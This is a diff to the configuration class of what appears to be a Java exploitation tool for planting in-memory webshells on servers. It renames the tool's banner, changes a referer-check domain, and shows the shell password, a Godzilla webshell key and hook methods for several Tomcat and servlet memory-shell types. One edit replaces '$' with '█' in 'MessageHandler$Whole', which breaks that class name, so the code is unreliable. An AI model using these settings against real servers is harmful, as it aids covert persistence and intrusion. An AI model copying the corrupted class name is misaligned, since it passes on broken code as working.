@@ -93,13 +93,14 @@ public class Config {
 
         if (showVersion) {
             System.out.println("" +
-                    "     ██╗███╗   ██╗██████╗ ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗\n" +
-                    "     ██║████╗  ██║██╔══██╗██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n" +
-                    "     ██║██╔██╗ ██║██║  ██║██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   \n" +
-                    "██   ██║██║╚██╗██║██║  ██║██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   \n" +
-                    "╚█████╔╝██║ ╚████║██████╔╝██║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   \n" +
-                    " ╚════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   \n" +
-                    "                                                                                  ");
+                    "    /█████ /██       /██                 \n" +
+                    "   |__  ██|  ██     /██/                 \n" +
+                    "      | ██ \\  ██  /██//███████  /██████ \n" +
+                    "      | ██  \\  ████//██_____/ /██__  ██\n" +
+                    " /██  | ██   \\  ██/|  ██████ | ██  \\ ██\n" +
+                    "| ██  | ██     | ██ \\____  ██| ██  | ██\n" +
+                    "|  ██████/     | ██  /███████/|  ██████/\n" +
+                    " \\______/     |__/ |_______/  \\______/");
             System.exit(0);
         }
 
@@ -144,14 +145,14 @@ public class Config {
     // 落地文件姿势，1 charsets.jar 2 classes
     public static int HIDE_MEMORY_SHELL_TYPE = 0;
 
-    // 内存马的密码
+    // 内存马的密码MD5
     public static String PASSWORD = "0f359740bd1cda99";
 
     // Referer 校验
-    public static String HEADER_KEY = "https://nu1r.cn/";
+    public static String HEADER_KEY = "https://QI4L.cn/";
 
-    // 用于额外校验的 Http Header 值，默认值 https://nu1r.cn/
-    public static String HEADER_VALUE = "https://nu1r.cn/";
+    // 用于额外校验的 Http Header 值，默认值 https://QI4L.cn/
+    public static String HEADER_VALUE = "https://QI4L.cn/";
 
     // 哥斯拉的 key，默认是 key
     public static String GODZILLA_KEY = "3c6e0b8a9c15224a";
@@ -212,7 +213,7 @@ public class Config {
         // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
         KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
         // Websocket 型内存马，关键方法 onMessage
-        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
+        KEY_METHOD_MAP.put("javax.websocket.MessageHandler█Whole", "onMessage");
         // Tomcat Upgrade 型内存马，关键方法 accept
         KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
         // Tomcat Executor 型内存马，关键方法 execute
@@ -229,7 +230,7 @@ public class Config {
         // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
         KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
         // Websocket 型内存马，关键方法 onMessage
-        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
+        KEY_METHOD_MAP.put("javax.websocket.MessageHandler█Whole", "onMessage");
         // Tomcat Upgrade 型内存马，关键方法 accept
         KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
         // Tomcat Executor 型内存马，关键方法 execute
